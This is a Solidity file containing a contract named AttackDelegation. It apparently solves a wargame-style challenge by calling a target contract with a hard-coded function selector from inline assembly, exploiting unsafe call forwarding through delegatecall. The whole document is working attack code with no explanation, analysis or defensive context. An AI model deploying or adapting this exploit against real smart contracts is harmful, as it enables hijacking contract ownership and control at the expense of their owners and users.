pragma solidity ^0.8.0;


contract AttackDelegation {
    address deletationContract;

    constructor(address _deletationContract){
        deletationContract = _deletationContract;
    }
    function attack() public {
        assembly {
            mstore(0x60, 0xdd365b8b)
            let contractAddress := sload(deletationContract.slot)
            let result := call(gas(), contractAddress, 0, 0x7c, 0x04, 0, 0)
            let size := returndatasize()
            returndatacopy(0x60, 0, size)
            switch result
            case 0 { revert(0x60, size) }
            default { return(0x60, size) }
        }
    }
}
